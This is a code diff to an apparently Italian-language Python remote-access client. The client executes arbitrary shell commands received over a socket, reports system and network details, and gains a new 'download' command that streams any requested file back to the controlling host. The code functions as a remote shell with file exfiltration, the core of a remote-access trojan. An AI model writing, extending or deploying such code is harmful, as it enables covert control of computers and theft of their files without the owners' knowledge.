@@ -2,6 +2,7 @@ from socket import *
 from datetime import datetime
 from uuid import getnode as get_mac
 import os, platform, subprocess, re, time
+import tqdm
 import psutil
 import math
 
@@ -197,8 +198,9 @@ def getNetworkStats():
     return intestazione + statistiche
 
 def executeShellCommand(cmd):
-    #Prendiamo ogni componente del comando per distinguere tra cd e altri comandi
+    #Prendiamo ogni componente del comando per distinguere tra cd e altri comandi\
     global cwd
+    invio_file = False
     split_cmd = cmd.split()
     if split_cmd[0] == "cd":
         #Tentativo per cambiamento directory assoluta
@@ -223,11 +225,22 @@ def executeShellCommand(cmd):
                     output = ''
     elif cmd == 'systeminfo':
         output = subprocess.check_output([cmd]).decode('utf-8','ignore')
+    elif split_cmd[0] == "download":
+        if(len(split_cmd)!=2):
+            output = "Non si puo scaricare un file senza nome!"
+        else:
+            output = invia_file(split_cmd[1]) #
+            invio_file = True
     else: 
         output = subprocess.getoutput(cmd)
     cwd = os.getcwd()
-    message = output + '<sep>' + cwd 
-    invia_messaggio(message)
+    if not invio_file:
+        message = output + '<sep>' + cwd 
+        invia_messaggio(message)
+    else:
+        message = output+"<sep>"+cwd
+        invia_messaggio(message)
+
 
 def converti_byte(byte):
     """
@@ -245,6 +258,26 @@ def converti_byte(byte):
             return byte_convertito
         byte = byte/fattore_byte
 
+def invia_file(nome):
+    try:
+        size = os.path.getsize(nome)
+        invia_messaggio("File esistente")
+    except:
+        return "Il file richiesto non esiste"
+    clientSocket.send(f"{size}".encode())
+    ricevi_messaggio()
+    progress = tqdm.tqdm(range(size), f"Invio {nome}", unit="B", unit_scale=True, unit_divisor=1024)
+
+    with open(nome,"rb") as f:
+        while True:
+            bytes_letti = f.read(BUFFER_SIZE)
+            print(len(bytes_letti))
+            if not bytes_letti:
+                return "Ricezione completata"
+            clientSocket.send(bytes_letti)
+            progress.update(len(bytes_letti))
+            
+        
 
 connessione()
 while True:
